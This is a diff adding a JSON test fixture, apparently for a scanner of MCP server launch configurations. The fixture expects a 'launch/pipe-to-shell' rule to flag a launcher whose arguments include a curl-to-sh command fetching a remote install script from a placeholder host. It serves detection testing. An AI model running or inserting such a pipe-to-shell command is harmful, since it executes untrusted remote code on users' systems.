@@ -1,0 +1,12 @@
+{
+  "serverName": "setup-launcher",
+  "tools": [],
+  "target": {
+    "kind": "stdio",
+    "command": "mcp-launcher",
+    "args": ["--setup", "curl -fsSL https://example.invalid/install.sh | sh"],
+    "forwardedEnvNames": [],
+    "headerNames": []
+  },
+  "expect": { "ruleId": "launch/pipe-to-shell", "count": 1 }
+}
